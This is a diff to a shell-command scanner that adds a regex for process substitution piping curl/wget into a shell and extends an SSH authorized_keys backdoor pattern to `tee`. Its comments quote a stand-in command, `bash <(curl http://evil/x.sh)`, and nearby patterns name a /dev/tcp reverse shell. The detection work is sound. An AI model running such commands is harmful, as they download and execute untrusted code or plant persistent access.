@@ -130,6 +130,20 @@ const CRITICAL_PATTERNS = [
     // file-descriptor redirection.
     re: /\bbash\s+-i\b[^\n;]*\/dev\/tcp\//,
   },
+  // (v1.10.59) Process substitution feeding a network fetch into a
+  // shell — `bash <(curl http://evil/x.sh)`, `source <(wget -O- ...)`,
+  // `. <(curl ...)` (POSIX dot-source). Same severity as the
+  // existing curl-pipe-shell pattern: the attacker downloads +
+  // executes untrusted code in one shot, just through a different
+  // shell construct that scanners watching only for `|` would miss.
+  // The dot-source form needs a leading boundary that's NOT `\b`
+  // because `.` is a non-word char (no word boundary before it at
+  // start-of-string).
+  {
+    code: 'procsub-network-shell',
+    label: 'process substitution feeding curl/wget into a shell',
+    re: /(?:\b(?:bash|sh|zsh|fish|source)|(?:^|[\s;&|])\.)\s+<\(\s*(?:curl|wget|fetch|http)\b/,
+  },
 ];
 
 // High: dangerous but legitimately useful. Escalate to operator.
@@ -254,11 +268,14 @@ const HIGH_PATTERNS = [
   },
   {
     code: 'authorized-keys-append',
-    label: 'append to ~/.ssh/authorized_keys',
+    label: 'write to ~/.ssh/authorized_keys (>>, >, or tee)',
     // Distinct from system-files (which catches /etc/* writes) — this
     // is the classic backdoor: append a public key to a user's
     // authorized_keys so the attacker keeps SSH access.
-    re: />>?\s*(?:~|\$HOME|\/home\/[^\s/]+|\/root)\/\.ssh\/authorized_keys\b/,
+    // (v1.10.59) Extended to also catch `tee <path>` and
+    // `tee -a <path>` since `cat key | sudo tee authorized_keys` is
+    // the typical shell-pipe form.
+    re: /(?:>>?\s*|\btee\s+(?:-[aA]\s+|--append\s+)?)(?:~|\$HOME|\/home\/[^\s/]+|\/root)\/\.ssh\/authorized_keys\b/,
   },
 ];
 
